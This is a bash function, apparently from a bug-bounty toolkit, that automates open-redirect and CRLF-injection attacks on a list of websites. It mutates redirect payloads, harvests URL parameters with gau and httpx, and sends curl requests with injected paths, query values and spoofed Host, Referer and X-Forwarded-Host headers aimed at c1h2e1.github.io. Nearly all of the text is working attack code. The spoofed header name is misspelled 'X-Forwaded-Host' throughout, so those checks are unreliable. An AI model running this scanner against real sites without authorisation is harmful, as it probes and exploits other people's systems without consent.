redscan(){
    echo -e "\nPREPARING LISTS\n"
    list=payloads.txt
    google_list=google.txt
    while read website; do while read payload; do echo -e "$website%40$payload" >> tmp_payloads && echo -e "$website//%0D%0a$payload" >> tmp_payloads && echo -e "$website.$payload" >> tmp_payloads && echo -e "$website//$payload/%2f%2e%2e" >> tmp_payloads && echo -e "$website#$payload" >> tmp_payloads && echo -e "$website/?$payload" >> tmp_payloads && echo -e "$website@$payload" >> tmp_payloads && echo -e "%09/$website%09@$payload" >> tmp_payloads && echo -e "/\\$website%40$payload" >> tmp_payloads; done < $list; done < $1
    cat $list | anew -q tmp_payloads
    shuf tmp_payloads > shf_pay; mv shf_pay tmp_payloads

    echo -e "\nRETREIVING ALIVE REDIRECT PARAMETERS\n"
    cat $1 | gau | grep -vE ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt|js|html|swf|mp4|webm|JPG|axd|wmv|htm|flv)" | grep --color=never -a -i \=http | sort -u | anew -q test_params.txt
    cat test_params.txt | httpx -fr -mc 200 -o tmp; mv tmp test_params.txt

    echo -e "\nSCANNING FOR CRLF INJECTIONS\n"
    while read website; do while read payload; do echo $website | while read p; do curl --connect-timeout 5 -s -L "$p/$payload" -I | grep "^Header-Test:" && echo "$p/$payload -- \033[0;31mVulnerable (CRLF)\n"; done; done < /home/dirac/HACKING/BOUNTIES/VULNS/CRLF/payloads.txt ; done < $1
    while read payload; do cat test_params.txt | qsreplace "$payload" | while read p; do curl --connect-timeout 5 -s -L $p -I | grep "^Header-Test:" && echo "$p -- \033[0;31mVulnerable (CRLF) \n"; done; done < /home/dirac/HACKING/BOUNTIES/VULNS/CRLF/payloads.txt

    echo -e "\nOPEN REDIRECT DOMAIN TESTS\n"
    while read website; do while read payload; do echo $website | while read p; do curl --connect-timeout 5 -s -L "$p/$payload" -I | grep -A 10 "200" | grep "GitHub" && echo "$p/$payload -- \033[0;31mVulnerable (Plain)\n"; done; done < $list; done < $1
    while read website; do while read payload; do echo $website | while read p; do curl --connect-timeout 5 -s -L "$p/$payload" -I | grep -A 10 "200" | grep "server: gws" && echo "$p/$payload -- \033[0;31mVulnerable (Plain)\n"; done; done < $google_list; done < $1
    while read website; do while read payload; do echo $website | while read p; do curl --connect-timeout 5 -H "Host: c1h2e1.github.io" -s -L "$p/$payload" -I | grep -A 10 "200" | grep "GitHub" && echo "$p/$payload -- \033[0;31mVulnerable (Host)\n"; done; done < $list; done < $1
    while read website; do while read payload; do echo $website | while read p; do curl --connect-timeout 5 -H "Referer: https://c1h2e1.github.io" -s -L "$p/$payload" -I | grep -A 10 "200" | grep "GitHub" && echo "$p/$payload -- \033[0;31mVulnerable (Referer)\n"; done; done < $list; done < $1
    while read website; do while read payload; do echo $website | while read p; do curl --connect-timeout 5 -H "X-Forwaded-Host: $1" -H "Host: c1h2e1.github.io" -s -L "$p/$payload" -I | grep -A 10 "200" | grep "GitHub" && echo "$p/$payload -- \033[0;31mVulnerable (X-Forward + Host)\n"; done; done < $list; done < $1
    while read website; do while read payload; do echo $website | while read p; do curl --connect-timeout 5 -H "X-Forwaded-Host: c1h2e1.github.io" -H "Host: $1" -s -L "$p/$payload" -I | grep -A 10 "200" | grep "GitHub" && echo "$p/$payload -- \033[0;31mVulnerable (X-Forward + Host)\n"; done; done < $list; done < $1

    echo -e "\nOPEN REDIRECTING THE PARAMETERS\n"
    while read payload; do cat test_params.txt | qsreplace "$payload" | while read p; do curl --connect-timeout 5 -s -L $p -I | grep -A 10 200 | grep "GitHub" && echo "$p -- \033[0;31mVulnerable (Plain) \n"; done; done < tmp_payloads
    while read payload; do cat test_params.txt | qsreplace "$payload" | while read p; do curl --connect-timeout 5 -s -L $p -I | grep -A 10 200 | grep "server: gws" && echo "$p -- \033[0;31mVulnerable (Plain) \n"; done; done < $google_list
    while read payload; do cat test_params.txt | qsreplace "$payload" | while read p; do curl --connect-timeout 5 -H "Referer: https://c1h2e1.github.io" -s -L $p -I | grep -A 10 200 | grep "GitHub" && echo "$p -- \033[0;31mVulnerable (Referer)"; done; done < tmp_payloads
    while read payload; do cat test_params.txt | qsreplace "$payload" | while read p; do curl --connect-timeout 5 -H "Host: c1h2e1.github.io" -s -L $p -I | grep -A 10 200 | grep "GitHub" && echo "$p -- \033[0;31mVulnerable (Host)\n"; done; done < tmp_payloads
    while read payload; do cat test_params.txt | qsreplace "$payload" | while read p; do curl --connect-timeout 5 -H "X-Forwaded-Host: $1" -H "Host: c1h2e1.github.io" -s -L $p -I | grep -A 10 200 | grep "GitHub" && echo "$p -- \033[0;31mVulnerable(X-Forwarded + Host)\n"; done; done < tmp_payloads
    while read payload; do cat test_params.txt | qsreplace "$payload" | while read p; do curl --connect-timeout 5 -H "X-Forwaded-Host: c1h2e1.github.io" -H "Host: $1" -s -L $p -I | grep -A 10 200 | grep "GitHub" && echo "$p -- \033[0;31mVulnerable (X-Forwaded + Host)\n"; done; done < tmp_payloads
    rm tmp_payloads
}
